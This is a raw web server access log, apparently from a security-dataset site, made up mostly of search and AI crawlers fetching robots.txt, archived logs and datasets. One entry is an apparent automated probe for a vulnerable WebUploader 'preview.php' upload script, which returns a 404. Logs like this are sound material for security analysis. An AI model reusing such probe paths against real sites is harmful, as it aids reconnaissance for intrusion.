216.244.66.245 - - [22/Sep/2024:10:56:18 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
114.119.151.93 - - [22/Sep/2024:10:58:22 -0700] "GET / HTTP/1.1" 200 13186 "http://www.secrepo.com/Datasets%20Description/Network/smtp.html" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
216.244.66.245 - - [22/Sep/2024:11:01:33 -0700] "GET /Datasets%20Description/PE_malware/OPCleaver.html HTTP/1.1" 200 4239 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
147.229.192.90 - - [22/Sep/2024:11:01:50 -0700] "GET /self.logs/ HTTP/1.1" 200 52179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0" 
216.244.66.245 - - [22/Sep/2024:11:02:31 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/notice.html HTTP/1.1" 200 6747 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:02:39 -0700] "GET /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1" 301 489 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:03:58 -0700] "GET /self.logs/2015/access.log.2015-06-04.gz HTTP/1.1" 200 5243 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:00 -0700] "GET /self.logs/2015/access.log.2015-07-23.gz HTTP/1.1" 200 4082 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:03 -0700] "GET /self.logs/2015/access.log.2015-12-05.gz HTTP/1.1" 200 5379 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:05 -0700] "GET /self.logs/2015/error.log.2015-07-23.gz HTTP/1.1" 200 1109 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:07 -0700] "GET /self.logs/2016/access.log.2016-01-28.gz HTTP/1.1" 200 14922 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:08 -0700] "GET /self.logs/2016/access.log.2016-04-20.gz HTTP/1.1" 200 9387 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:10 -0700] "GET /self.logs/2016/access.log.2016-05-31.gz HTTP/1.1" 200 10148 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:12 -0700] "GET /self.logs/2016/access.log.2016-06-08.gz HTTP/1.1" 200 8793 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:13 -0700] "GET /self.logs/2016/access.log.2016-10-28.gz HTTP/1.1" 200 7337 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:14 -0700] "GET /self.logs/2016/error.log.2016-01-29.gz HTTP/1.1" 200 688 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:15 -0700] "GET /self.logs/2016/error.log.2016-06-22.gz HTTP/1.1" 200 964 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:16 -0700] "GET /self.logs/2016/error.log.2016-07-26.gz HTTP/1.1" 200 909 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:17 -0700] "GET /self.logs/access.log.2017-04-26.gz HTTP/1.1" 200 15918 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:17 -0700] "GET /self.logs/access.log.2017-08-09.gz HTTP/1.1" 200 26624 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:18 -0700] "GET /self.logs/access.log.2017-10-12.gz HTTP/1.1" 200 29849 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:19 -0700] "GET /self.logs/access.log.2018-08-14.gz HTTP/1.1" 200 27954 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:20 -0700] "GET /self.logs/access.log.2019-02-23.gz HTTP/1.1" 200 22917 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:21 -0700] "GET /self.logs/access.log.2019-08-20.gz HTTP/1.1" 200 22782 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:24 -0700] "GET /self.logs/access.log.2019-10-23.gz HTTP/1.1" 200 29037 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:26 -0700] "GET /self.logs/access.log.2019-10-29.gz HTTP/1.1" 200 26250 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:27 -0700] "GET /self.logs/access.log.2021-11-12.gz HTTP/1.1" 200 15776 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:29 -0700] "GET /self.logs/access.log.2021-12-06.gz HTTP/1.1" 200 27840 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:30 -0700] "GET /self.logs/access.log.2017-07-08.gz HTTP/1.1" 200 12999 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:31 -0700] "GET /self.logs/access.log.2019-12-08.gz HTTP/1.1" 200 17259 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:32 -0700] "GET /self.logs/access.log.2020-04-07.gz HTTP/1.1" 200 16383 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:33 -0700] "GET /self.logs/access.log.2020-07-25.gz HTTP/1.1" 200 18566 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:34 -0700] "GET /self.logs/access.log.2020-09-25.gz HTTP/1.1" 200 18521 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:34 -0700] "GET /self.logs/access.log.2020-12-23.gz HTTP/1.1" 200 20296 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:35 -0700] "GET /self.logs/access.log.2021-02-15.gz HTTP/1.1" 200 18981 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:36 -0700] "GET /self.logs/access.log.2021-09-01.gz HTTP/1.1" 200 15502 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:41 -0700] "GET /self.logs/access.log.2020-02-04.gz HTTP/1.1" 200 12964 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:42 -0700] "GET /self.logs/access.log.2020-06-14.gz HTTP/1.1" 200 10756 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:43 -0700] "GET /self.logs/access.log.2021-03-19.gz HTTP/1.1" 200 12829 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:04:46 -0700] "GET /self.logs/error.log.2024-02-10.gz HTTP/1.1" 200 1077 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:06 -0700] "GET /self.logs/error.log.2022-07-16.gz HTTP/1.1" 200 1250 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:07 -0700] "GET /self.logs/error.log.2022-12-10.gz HTTP/1.1" 200 2151 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:09 -0700] "GET /self.logs/error.log.2022-12-23.gz HTTP/1.1" 200 704 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:10 -0700] "GET /self.logs/error.log.2023-03-13.gz HTTP/1.1" 200 1516 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:10 -0700] "GET /self.logs/error.log.2023-08-15.gz HTTP/1.1" 200 2697 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:11 -0700] "GET /self.logs/error.log.2023-11-18.gz HTTP/1.1" 200 1905 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:25 -0700] "GET /self.logs/error.log.2017-04-19.gz HTTP/1.1" 200 978 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:26 -0700] "GET /self.logs/error.log.2017-09-17.gz HTTP/1.1" 200 1967 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:26 -0700] "GET /self.logs/error.log.2017-11-12.gz HTTP/1.1" 200 1802 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:27 -0700] "GET /self.logs/error.log.2017-12-17.gz HTTP/1.1" 200 1978 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:27 -0700] "GET /self.logs/error.log.2020-02-25 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:29 -0700] "GET /self.logs/error.log.2020-05-03.gz HTTP/1.1" 200 917 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:31 -0700] "GET /self.logs/error.log.2020-06-06 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:33 -0700] "GET /self.logs/error.log.2020-07-31.gz HTTP/1.1" 200 772 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:34 -0700] "GET /self.logs/error.log.2020-11-08 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:35 -0700] "GET /self.logs/error.log.2021-01-11.gz HTTP/1.1" 200 933 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:36 -0700] "GET /self.logs/error.log.2021-02-06.gz HTTP/1.1" 200 1730 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:37 -0700] "GET /self.logs/error.log.2021-06-05 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:38 -0700] "GET /self.logs/error.log.2021-07-08.gz HTTP/1.1" 200 1106 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:38 -0700] "GET /self.logs/error.log.2021-07-21 HTTP/1.1" 200 1063 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:39 -0700] "GET /self.logs/error.log.2021-08-10.gz HTTP/1.1" 200 1935 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:40 -0700] "GET /self.logs/error.log.2021-10-06.gz HTTP/1.1" 200 3948 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:41 -0700] "GET /self.logs/error.log.2021-11-09.gz HTTP/1.1" 200 5588 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:44 -0700] "GET /self.logs/error.log.2023-03-05.gz HTTP/1.1" 200 4969 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:53 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/?C=M;O=A HTTP/1.1" 200 1897 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:05:55 -0700] "GET /self.logs/access.log.2023-03-04.gz HTTP/1.1" 200 17923 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:06:20 -0700] "GET /self.logs/error.log.2018-06-25.gz HTTP/1.1" 200 5850 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:06:22 -0700] "GET /self.logs/error.log.2018-07-02.gz HTTP/1.1" 200 7874 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:06:47 -0700] "GET /self.logs/access.log.2022-10-22.gz HTTP/1.1" 200 13544 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
147.229.192.90 - - [22/Sep/2024:11:12:52 -0700] "GET /self.logs/access.log.2017-01-03.gz HTTP/1.1" 200 41164 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0" 
51.222.253.18 - - [22/Sep/2024:11:13:07 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.13 - - [22/Sep/2024:11:20:10 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.2 - - [22/Sep/2024:11:20:42 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
207.46.13.7 - - [22/Sep/2024:11:21:05 -0700] "GET /self.logs/access.log.2018-05-30.gz HTTP/1.1" 301 487 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
51.222.253.8 - - [22/Sep/2024:11:27:41 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.7 - - [22/Sep/2024:11:31:17 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
118.107.9.17 - - [22/Sep/2024:11:34:24 -0700] "GET /fix/Public/Webuploader/server/preview.php HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
51.222.253.7 - - [22/Sep/2024:11:34:44 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.2 - - [22/Sep/2024:11:38:07 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
157.55.39.58 - - [22/Sep/2024:11:42:42 -0700] "GET /self.logs/access.log.2023-05-30.gz HTTP/1.1" 301 487 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
51.222.253.4 - - [22/Sep/2024:11:44:50 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.5 - - [22/Sep/2024:11:48:14 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.11 - - [22/Sep/2024:11:50:20 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.5 - - [22/Sep/2024:11:51:03 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [22/Sep/2024:11:52:23 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
51.222.253.8 - - [22/Sep/2024:11:54:59 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.3 - - [22/Sep/2024:11:58:20 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [22/Sep/2024:11:59:39 -0700] "GET /self.logs/access.log.2022-03-18.gz HTTP/1.1" 200 15381 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:59:43 -0700] "GET /self.logs/access.log.2022-03-20.gz HTTP/1.1" 200 17468 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:59:53 -0700] "GET /self.logs/access.log.2020-02-17.gz HTTP/1.1" 200 15737 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:11:59:56 -0700] "GET /self.logs/access.log.2020-07-15.gz HTTP/1.1" 200 18812 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:00:00 -0700] "GET /self.logs/access.log.2021-01-28.gz HTTP/1.1" 200 17021 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:00:03 -0700] "GET /self.logs/access.log.2021-03-23.gz HTTP/1.1" 200 15151 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:00:06 -0700] "GET /self.logs/access.log.2022-01-18.gz HTTP/1.1" 200 11513 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:00:09 -0700] "GET /self.logs/access.log.2022-03-28.gz HTTP/1.1" 200 13341 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:00:11 -0700] "GET /self.logs/access.log.2022-06-23.gz HTTP/1.1" 200 13932 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:00:13 -0700] "GET /self.logs/access.log.2020-05-08.gz HTTP/1.1" 200 10637 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:00:14 -0700] "GET /self.logs/error.log.2024-01-21.gz HTTP/1.1" 200 1324 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:00:30 -0700] "GET /self.logs/error.log.2023-07-14.gz HTTP/1.1" 200 1218 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
114.119.141.178 - - [22/Sep/2024:12:00:30 -0700] "GET /honeypot/?C=N%3BO%3DD HTTP/1.1" 200 782 "http://www.secrepo.com/honeypot/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
216.244.66.245 - - [22/Sep/2024:12:00:31 -0700] "GET /self.logs/error.log.2023-10-20.gz HTTP/1.1" 200 2108 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:00:32 -0700] "GET /self.logs/error.log.2024-01-18.gz HTTP/1.1" 200 8805 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
20.171.206.216 - - [22/Sep/2024:12:00:41 -0700] "GET /robots.txt HTTP/1.1" 200 340 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.0; +https://openai.com/gptbot)" 
20.171.206.39 - - [22/Sep/2024:12:01:02 -0700] "GET / HTTP/1.1" 200 13149 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.0; +https://openai.com/gptbot)" 
20.171.206.220 - - [22/Sep/2024:12:01:02 -0700] "GET /robots.txt HTTP/1.1" 301 458 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.0; +https://openai.com/gptbot)" 
20.171.206.220 - - [22/Sep/2024:12:01:02 -0700] "GET /robots.txt HTTP/1.1" 200 340 "http://secrepo.com/robots.txt" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.0; +https://openai.com/gptbot)" 
20.171.206.116 - - [22/Sep/2024:12:01:26 -0700] "GET /css/style.css HTTP/1.1" 404 291 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.0; +https://openai.com/gptbot)" 
20.171.206.116 - - [22/Sep/2024:12:01:27 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 204480 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.0; +https://openai.com/gptbot)" 
20.171.206.116 - - [22/Sep/2024:12:01:28 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 167040 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.0; +https://openai.com/gptbot)" 
20.171.206.116 - - [22/Sep/2024:12:01:29 -0700] "GET /Datasets%20Description/Network/signatures.html HTTP/1.1" 404 291 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.0; +https://openai.com/gptbot)" 
20.171.206.116 - - [22/Sep/2024:12:01:30 -0700] "GET /data HTTP/1.1" 404 291 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.0; +https://openai.com/gptbot)" 
216.244.66.245 - - [22/Sep/2024:12:01:55 -0700] "GET /self.logs/access.log.2022-11-03.gz HTTP/1.1" 200 10194 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:01:56 -0700] "GET /self.logs/access.log.2023-01-10.gz HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:01:57 -0700] "GET /self.logs/access.log.2023-05-05.gz HTTP/1.1" 200 11015 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
51.222.253.11 - - [22/Sep/2024:12:04:55 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
117.50.47.115 - - [22/Sep/2024:12:05:10 -0700] "GET /maccdc2012/maccdc2012_full_alert.7z HTTP/1.1" 200 8330800 "-" "Mozilla/5.0 (compatible; ChatGLM-Spider/1.0; +https://chatglm.cn/)" 
51.222.253.9 - - [22/Sep/2024:12:07:01 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.10 - - [22/Sep/2024:12:08:09 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
157.55.39.12 - - [22/Sep/2024:12:11:39 -0700] "GET /self.logs/access.log.2023-08-20.gz HTTP/1.1" 301 487 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
20.171.206.21 - - [22/Sep/2024:12:12:30 -0700] "GET / HTTP/1.1" 200 13149 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.0; +https://openai.com/gptbot)" 
47.128.44.202 - - [22/Sep/2024:12:17:38 -0700] "GET /self.logs/?C=S%3BO=A HTTP/1.1" 200 52179 "-" "Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.0.0 Safari/537.36" 
